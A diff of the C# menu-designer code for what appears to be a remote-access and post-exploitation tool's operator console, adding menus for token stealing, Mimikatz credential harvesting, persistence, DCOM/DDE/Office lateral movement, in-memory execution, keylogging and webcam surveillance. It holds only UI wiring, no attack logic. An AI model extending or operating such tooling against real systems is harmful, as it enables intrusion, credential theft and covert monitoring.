@@ -40,25 +40,40 @@ namespace xServer.Forms
             this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.viewLogToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.systemInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.runLocalWMICommandToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.situationalAwarenessChecksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.startupManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.taskManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.connectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.registryEditorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.informationGatheringToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.systemInformationToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.startupManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.taskManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.tCPConnectionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.situationalAwarenessChecksToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.interactionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.fileManagerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.remoteShellToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.powerPickToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.registryEditorToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.runLocalWMICommandToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.impersonationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.makeTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.stealProcessTokenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.beginImpersonationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.revertToSelfToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.privilegeEscalationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.privilegeEscalationChecksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.askToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.credentialHarvestingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.mimikatzToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.sessionGopherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.persistenceToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.wMIToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.registryRunKeyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.scheduledTasksToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.newServiceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
             this.actionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.standbyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.credentialHarvestingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.networkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.informationGatheringToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.activeDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -73,20 +88,32 @@ namespace xServer.Forms
             this.passTheHashToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.wMIExecToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.sMBExecToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
-            this.dCOMToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.wMIMethodToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.dCOMToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.mSWORDDDEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.excelDDEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.mMC20ApplicationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.sHELLWINDOWSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.shellBrowserWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.visioAddonExecutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.outlookExecutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.arbitraryLibraryLoadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.wordWLLAddInToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.outlookScriptExecutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.visioExecuteLineToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.officeMacroToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.persistenceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.surveillanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.oSPasswordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.mimikatzToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.miscellaneousToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.remoteExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.localFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.webFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.localFileInMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.nETAssemblyInMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.showMessageboxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.openChatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -113,6 +140,8 @@ namespace xServer.Forms
             this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.serverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.hostFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.contextMenuStrip.SuspendLayout();
             this.tableLayoutPanel.SuspendLayout();
             this.statusStrip.SuspendLayout();
@@ -130,7 +159,7 @@ namespace xServer.Forms
             this.lineToolStripMenuItem,
             this.selectAllToolStripMenuItem});
             this.contextMenuStrip.Name = "ctxtMenu";
-            this.contextMenuStrip.Size = new System.Drawing.Size(153, 164);
+            this.contextMenuStrip.Size = new System.Drawing.Size(162, 164);
             // 
             // connectionToolStripMenuItem
             // 
@@ -142,14 +171,14 @@ namespace xServer.Forms
             this.viewLogToolStripMenuItem});
             this.connectionToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("connectionToolStripMenuItem.Image")));
             this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
-            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.connectionToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
             this.connectionToolStripMenuItem.Text = "Connection";
             // 
             // updateToolStripMenuItem
             // 
             this.updateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("updateToolStripMenuItem.Image")));
             this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
-            this.updateToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.updateToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.updateToolStripMenuItem.Text = "Update";
             this.updateToolStripMenuItem.Click += new System.EventHandler(this.updateToolStripMenuItem_Click);
             // 
@@ -157,7 +186,7 @@ namespace xServer.Forms
             // 
             this.reconnectToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("reconnectToolStripMenuItem.Image")));
             this.reconnectToolStripMenuItem.Name = "reconnectToolStripMenuItem";
-            this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.reconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.reconnectToolStripMenuItem.Text = "Reconnect";
             this.reconnectToolStripMenuItem.Click += new System.EventHandler(this.reconnectToolStripMenuItem_Click);
             // 
@@ -165,7 +194,7 @@ namespace xServer.Forms
             // 
             this.disconnectToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("disconnectToolStripMenuItem.Image")));
             this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
-            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.disconnectToolStripMenuItem.Text = "Disconnect";
             this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
             // 
@@ -173,7 +202,7 @@ namespace xServer.Forms
             // 
             this.uninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uninstallToolStripMenuItem.Image")));
             this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
-            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.uninstallToolStripMenuItem.Text = "Uninstall";
             this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
             // 
@@ -181,123 +210,166 @@ namespace xServer.Forms
             // 
             this.viewLogToolStripMenuItem.Image = global::xServer.Properties.Resources.copy;
             this.viewLogToolStripMenuItem.Name = "viewLogToolStripMenuItem";
-            this.viewLogToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.viewLogToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
             this.viewLogToolStripMenuItem.Text = "View Log";
             this.viewLogToolStripMenuItem.Click += new System.EventHandler(this.viewLogToolStripMenuItem_Click);
             // 
             // systemToolStripMenuItem
             // 
             this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.systemInformationToolStripMenuItem,
-            this.runLocalWMICommandToolStripMenuItem,
-            this.situationalAwarenessChecksToolStripMenuItem,
-            this.fileManagerToolStripMenuItem,
-            this.startupManagerToolStripMenuItem,
-            this.taskManagerToolStripMenuItem,
-            this.remoteShellToolStripMenuItem,
-            this.connectionsToolStripMenuItem,
-            this.reverseProxyToolStripMenuItem,
-            this.registryEditorToolStripMenuItem,
-            this.elevateClientPermissionsToolStripMenuItem,
+            this.informationGatheringToolStripMenuItem,
+            this.interactionToolStripMenuItem,
             this.privilegeEscalationToolStripMenuItem,
+            this.credentialHarvestingToolStripMenuItem,
+            this.persistenceToolStripMenuItem1,
+            this.reverseProxyToolStripMenuItem,
             this.ctxtLine,
-            this.actionsToolStripMenuItem,
-            this.credentialHarvestingToolStripMenuItem});
+            this.actionsToolStripMenuItem});
             this.systemToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemToolStripMenuItem.Image")));
             this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
-            this.systemToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
-            this.systemToolStripMenuItem.Text = "System";
+            this.systemToolStripMenuItem.Size = new System.Drawing.Size(161, 22);
+            this.systemToolStripMenuItem.Text = "Host";
             // 
-            // systemInformationToolStripMenuItem
+            // informationGatheringToolStripMenuItem
             // 
-            this.systemInformationToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("systemInformationToolStripMenuItem.Image")));
-            this.systemInformationToolStripMenuItem.Name = "systemInformationToolStripMenuItem";
-            this.systemInformationToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.systemInformationToolStripMenuItem.Text = "System Information";
-            this.systemInformationToolStripMenuItem.Click += new System.EventHandler(this.systemInformationToolStripMenuItem_Click);
+            this.informationGatheringToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.systemInformationToolStripMenuItem1,
+            this.startupManagerToolStripMenuItem1,
+            this.taskManagerToolStripMenuItem1,
+            this.tCPConnectionsToolStripMenuItem,
+            this.situationalAwarenessChecksToolStripMenuItem1});
+            this.informationGatheringToolStripMenuItem.Name = "informationGatheringToolStripMenuItem";
+            this.informationGatheringToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
+            this.informationGatheringToolStripMenuItem.Text = "Information Gathering";
             // 
-            // runLocalWMICommandToolStripMenuItem
+            // systemInformationToolStripMenuItem1
             // 
-            this.runLocalWMICommandToolStripMenuItem.Name = "runLocalWMICommandToolStripMenuItem";
-            this.runLocalWMICommandToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.runLocalWMICommandToolStripMenuItem.Text = "Run Local WMI Command";
+            this.systemInformationToolStripMenuItem1.Name = "systemInformationToolStripMenuItem1";
+            this.systemInformationToolStripMenuItem1.Size = new System.Drawing.Size(230, 22);
+            this.systemInformationToolStripMenuItem1.Text = "System Information";
+            this.systemInformationToolStripMenuItem1.Click += new System.EventHandler(this.systemInformationToolStripMenuItem1_Click);
             // 
-            // situationalAwarenessChecksToolStripMenuItem
+            // startupManagerToolStripMenuItem1
             // 
-            this.situationalAwarenessChecksToolStripMenuItem.Name = "situationalAwarenessChecksToolStripMenuItem";
-            this.situationalAwarenessChecksToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.situationalAwarenessChecksToolStripMenuItem.Text = "Situational Awareness Checks";
+            this.startupManagerToolStripMenuItem1.Name = "startupManagerToolStripMenuItem1";
+            this.startupManagerToolStripMenuItem1.Size = new System.Drawing.Size(230, 22);
+            this.startupManagerToolStripMenuItem1.Text = "Startup Manager";
+            this.startupManagerToolStripMenuItem1.Click += new System.EventHandler(this.startupManagerToolStripMenuItem1_Click);
             // 
-            // fileManagerToolStripMenuItem
+            // taskManagerToolStripMenuItem1
             // 
-            this.fileManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileManagerToolStripMenuItem.Image")));
-            this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
-            this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.fileManagerToolStripMenuItem.Text = "File Manager";
-            this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
+            this.taskManagerToolStripMenuItem1.Name = "taskManagerToolStripMenuItem1";
+            this.taskManagerToolStripMenuItem1.Size = new System.Drawing.Size(230, 22);
+            this.taskManagerToolStripMenuItem1.Text = "Task Manager";
+            this.taskManagerToolStripMenuItem1.Click += new System.EventHandler(this.taskManagerToolStripMenuItem1_Click);
             // 
-            // startupManagerToolStripMenuItem
+            // tCPConnectionsToolStripMenuItem
             // 
-            this.startupManagerToolStripMenuItem.Image = global::xServer.Properties.Resources.startup_programs;
-            this.startupManagerToolStripMenuItem.Name = "startupManagerToolStripMenuItem";
-            this.startupManagerToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.startupManagerToolStripMenuItem.Text = "Startup Manager";
-            this.startupManagerToolStripMenuItem.Click += new System.EventHandler(this.startupManagerToolStripMenuItem_Click);
+            this.tCPConnectionsToolStripMenuItem.Name = "tCPConnectionsToolStripMenuItem";
+            this.tCPConnectionsToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
+            this.tCPConnectionsToolStripMenuItem.Text = "TCP Connections";
+            this.tCPConnectionsToolStripMenuItem.Click += new System.EventHandler(this.tCPConnectionsToolStripMenuItem_Click);
             // 
-            // taskManagerToolStripMenuItem
+            // situationalAwarenessChecksToolStripMenuItem1
             // 
-            this.taskManagerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("taskManagerToolStripMenuItem.Image")));
-            this.taskManagerToolStripMenuItem.Name = "taskManagerToolStripMenuItem";
-            this.taskManagerToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.taskManagerToolStripMenuItem.Text = "Task Manager";
-            this.taskManagerToolStripMenuItem.Click += new System.EventHandler(this.taskManagerToolStripMenuItem_Click);
+            this.situationalAwarenessChecksToolStripMenuItem1.Name = "situationalAwarenessChecksToolStripMenuItem1";
+            this.situationalAwarenessChecksToolStripMenuItem1.Size = new System.Drawing.Size(230, 22);
+            this.situationalAwarenessChecksToolStripMenuItem1.Text = "Situational Awareness Checks";
             // 
-            // remoteShellToolStripMenuItem
+            // interactionToolStripMenuItem
             // 
-            this.remoteShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteShellToolStripMenuItem.Image")));
-            this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
-            this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.remoteShellToolStripMenuItem.Text = "Remote Shell";
-            this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
+            this.interactionToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.fileManagerToolStripMenuItem1,
+            this.remoteShellToolStripMenuItem1,
+            this.powerPickToolStripMenuItem,
+            this.registryEditorToolStripMenuItem1,
+            this.runLocalWMICommandToolStripMenuItem1,
+            this.impersonationToolStripMenuItem});
+            this.interactionToolStripMenuItem.Name = "interactionToolStripMenuItem";
+            this.interactionToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
+            this.interactionToolStripMenuItem.Text = "Interaction";
             // 
-            // connectionsToolStripMenuItem
+            // fileManagerToolStripMenuItem1
             // 
-            this.connectionsToolStripMenuItem.Image = global::xServer.Properties.Resources.transmit_blue;
-            this.connectionsToolStripMenuItem.Name = "connectionsToolStripMenuItem";
-            this.connectionsToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.connectionsToolStripMenuItem.Text = "TCP Connections";
-            this.connectionsToolStripMenuItem.Click += new System.EventHandler(this.connectionsToolStripMenuItem_Click);
+            this.fileManagerToolStripMenuItem1.Name = "fileManagerToolStripMenuItem1";
+            this.fileManagerToolStripMenuItem1.Size = new System.Drawing.Size(183, 22);
+            this.fileManagerToolStripMenuItem1.Text = "File Manager";
+            this.fileManagerToolStripMenuItem1.Click += new System.EventHandler(this.fileManagerToolStripMenuItem1_Click);
             // 
-            // reverseProxyToolStripMenuItem
+            // remoteShellToolStripMenuItem1
             // 
-            this.reverseProxyToolStripMenuItem.Image = global::xServer.Properties.Resources.server_link;
-            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
-            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
-            this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
+            this.remoteShellToolStripMenuItem1.Name = "remoteShellToolStripMenuItem1";
+            this.remoteShellToolStripMenuItem1.Size = new System.Drawing.Size(183, 22);
+            this.remoteShellToolStripMenuItem1.Text = "Remote Shell";
+            this.remoteShellToolStripMenuItem1.Click += new System.EventHandler(this.remoteShellToolStripMenuItem1_Click);
             // 
-            // registryEditorToolStripMenuItem
+            // powerPickToolStripMenuItem
             // 
-            this.registryEditorToolStripMenuItem.Image = global::xServer.Properties.Resources.registry;
-            this.registryEditorToolStripMenuItem.Name = "registryEditorToolStripMenuItem";
-            this.registryEditorToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.registryEditorToolStripMenuItem.Text = "Registry Editor";
-            this.registryEditorToolStripMenuItem.Click += new System.EventHandler(this.registryEditorToolStripMenuItem_Click);
+            this.powerPickToolStripMenuItem.Name = "powerPickToolStripMenuItem";
+            this.powerPickToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.powerPickToolStripMenuItem.Text = "PowerPick";
+            this.powerPickToolStripMenuItem.Click += new System.EventHandler(this.powerPickToolStripMenuItem_Click);
             // 
-            // elevateClientPermissionsToolStripMenuItem
+            // registryEditorToolStripMenuItem1
             // 
-            this.elevateClientPermissionsToolStripMenuItem.Image = global::xServer.Properties.Resources.uac_shield;
-            this.elevateClientPermissionsToolStripMenuItem.Name = "elevateClientPermissionsToolStripMenuItem";
-            this.elevateClientPermissionsToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
-            this.elevateClientPermissionsToolStripMenuItem.Text = "Elevate Client Permissions";
-            this.elevateClientPermissionsToolStripMenuItem.Click += new System.EventHandler(this.elevateClientPermissionsToolStripMenuItem_Click);
+            this.registryEditorToolStripMenuItem1.Name = "registryEditorToolStripMenuItem1";
+            this.registryEditorToolStripMenuItem1.Size = new System.Drawing.Size(183, 22);
+            this.registryEditorToolStripMenuItem1.Text = "Registry Editor";
+            this.registryEditorToolStripMenuItem1.Click += new System.EventHandler(this.registryEditorToolStripMenuItem1_Click);
+            // 
+            // runLocalWMICommandToolStripMenuItem1
+            // 
+            this.runLocalWMICommandToolStripMenuItem1.Name = "runLocalWMICommandToolStripMenuItem1";
+            this.runLocalWMICommandToolStripMenuItem1.Size = new System.Drawing.Size(183, 22);
+            this.runLocalWMICommandToolStripMenuItem1.Text = "Run WMI Command";
+            this.runLocalWMICommandToolStripMenuItem1.Click += new System.EventHandler(this.runLocalWMICommandToolStripMenuItem1_Click);
+            // 
+            // impersonationToolStripMenuItem
+            // 
+            this.impersonationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.makeTokenToolStripMenuItem,
+            this.stealProcessTokenToolStripMenuItem,
+            this.beginImpersonationToolStripMenuItem,
+            this.revertToSelfToolStripMenuItem});
+            this.impersonationToolStripMenuItem.Name = "impersonationToolStripMenuItem";
+            this.impersonationToolStripMenuItem.Size = new System.Drawing.Size(183, 22);
+            this.impersonationToolStripMenuItem.Text = "Impersonation";
+            // 
+            // makeTokenToolStripMenuItem
+            // 
+            this.makeTokenToolStripMenuItem.Name = "makeTokenToolStripMenuItem";
+            this.makeTokenToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.makeTokenToolStripMenuItem.Text = "Make Token";
+            this.makeTokenToolStripMenuItem.Click += new System.EventHandler(this.makeTokenToolStripMenuItem_Click);
+            // 
+            // stealProcessTokenToolStripMenuItem
+            // 
+            this.stealProcessTokenToolStripMenuItem.Name = "stealProcessTokenToolStripMenuItem";
+            this.stealProcessTokenToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.stealProcessTokenToolStripMenuItem.Text = "Steal Process Token";
+            this.stealProcessTokenToolStripMenuItem.Click += new System.EventHandler(this.stealProcessTokenToolStripMenuItem_Click);
+            // 
+            // beginImpersonationToolStripMenuItem
+            // 
+            this.beginImpersonationToolStripMenuItem.Name = "beginImpersonationToolStripMenuItem";
+            this.beginImpersonationToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.beginImpersonationToolStripMenuItem.Text = "Impersonation Menu";
+            this.beginImpersonationToolStripMenuItem.Click += new System.EventHandler(this.beginImpersonationToolStripMenuItem_Click);
+            // 
+            // revertToSelfToolStripMenuItem
+            // 
+            this.revertToSelfToolStripMenuItem.Name = "revertToSelfToolStripMenuItem";
+            this.revertToSelfToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
+            this.revertToSelfToolStripMenuItem.Text = "Revert To Self";
+            this.revertToSelfToolStripMenuItem.Click += new System.EventHandler(this.revertToSelfToolStripMenuItem_Click);
             // 
             // privilegeEscalationToolStripMenuItem
             // 
             this.privilegeEscalationToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.privilegeEscalationChecksToolStripMenuItem});
+            this.privilegeEscalationChecksToolStripMenuItem,
+            this.askToolStripMenuItem});
             this.privilegeEscalationToolStripMenuItem.Name = "privilegeEscalationToolStripMenuItem";
-            this.privilegeEscalationToolStripMenuItem.Size = new System.Drawing.Size(230, 22);
+            this.privilegeEscalationToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
             this.privilegeEscalationToolStripMenuItem.Text = "Privilege Escalation";
             // 
             // privilegeEscalationChecksToolStripMenuItem
@@ -306,10 +378,82 @@ namespace xServer.Forms
             this.privilegeEscalationChecksToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
             this.privilegeEscalationChecksToolStripMenuItem.Text = "Privilege Escalation Checks";
             // 
+            // askToolStripMenuItem
+            // 
+            this.askToolStripMenuItem.Name = "askToolStripMenuItem";
+            this.askToolStripMenuItem.Size = new System.Drawing.Size(216, 22);
+            this.askToolStripMenuItem.Text = "UAC Ask";
+            this.askToolStripMenuItem.Click += new System.EventHandler(this.askToolStripMenuItem_Click);
+            // 
+            // credentialHarvestingToolStripMenuItem
+            // 
+            this.credentialHarvestingToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.mimikatzToolStripMenuItem1,
+            this.sessionGopherToolStripMenuItem});
+            this.credentialHarvestingToolStripMenuItem.Name = "credentialHarvestingToolStripMenuItem";
+            this.credentialHarvestingToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
+            this.credentialHarvestingToolStripMenuItem.Text = "Credential Harvesting";
+            // 
+            // mimikatzToolStripMenuItem1
+            // 
+            this.mimikatzToolStripMenuItem1.Name = "mimikatzToolStripMenuItem1";
+            this.mimikatzToolStripMenuItem1.Size = new System.Drawing.Size(155, 22);
+            this.mimikatzToolStripMenuItem1.Text = "Mimikatz";
+            // 
+            // sessionGopherToolStripMenuItem
+            // 
+            this.sessionGopherToolStripMenuItem.Name = "sessionGopherToolStripMenuItem";
+            this.sessionGopherToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
+            this.sessionGopherToolStripMenuItem.Text = "Session Gopher";
+            // 
+            // persistenceToolStripMenuItem1
+            // 
+            this.persistenceToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.wMIToolStripMenuItem,
+            this.registryRunKeyToolStripMenuItem,
+            this.scheduledTasksToolStripMenuItem,
+            this.newServiceToolStripMenuItem});
+            this.persistenceToolStripMenuItem1.Name = "persistenceToolStripMenuItem1";
+            this.persistenceToolStripMenuItem1.Size = new System.Drawing.Size(192, 22);
+            this.persistenceToolStripMenuItem1.Text = "Persistence";
+            // 
+            // wMIToolStripMenuItem
+            // 
+            this.wMIToolStripMenuItem.Name = "wMIToolStripMenuItem";
+            this.wMIToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
+            this.wMIToolStripMenuItem.Text = "WMI";
+            this.wMIToolStripMenuItem.Click += new System.EventHandler(this.wMIToolStripMenuItem_Click);
+            // 
+            // registryRunKeyToolStripMenuItem
+            // 
+            this.registryRunKeyToolStripMenuItem.Name = "registryRunKeyToolStripMenuItem";
+            this.registryRunKeyToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
+            this.registryRunKeyToolStripMenuItem.Text = "Registry Run Key";
+            // 
+            // scheduledTasksToolStripMenuItem
+            // 
+            this.scheduledTasksToolStripMenuItem.Name = "scheduledTasksToolStripMenuItem";
+            this.scheduledTasksToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
+            this.scheduledTasksToolStripMenuItem.Text = "Scheduled Tasks";
+            // 
+            // newServiceToolStripMenuItem
+            // 
+            this.newServiceToolStripMenuItem.Name = "newServiceToolStripMenuItem";
+            this.newServiceToolStripMenuItem.Size = new System.Drawing.Size(162, 22);
+            this.newServiceToolStripMenuItem.Text = "New Service";
+            // 
+            // reverseProxyToolStripMenuItem
+            // 
+            this.reverseProxyToolStripMenuItem.Image = global::xServer.Properties.Resources.server_link;
+            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
+            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(192, 22);
+            this.reverseProxyToolStripMenuItem.Text = "Reverse Proxy";
+            this.reverseProxyToolStripMenuItem.Click += new System.EventHandler(this.reverseProxyToolStripMenuItem_Click);
+            // 
             // ctxtLine
             // 
             this.ctxtLine.Name = "ctxtLine";
-            this.ctxtLine.Size = new System.Drawing.Size(227, 6);
+            this.ctxtLine.Size = new System.Drawing.Size(189, 6);
             // 
             // actionsToolStripMenuItem
             // 
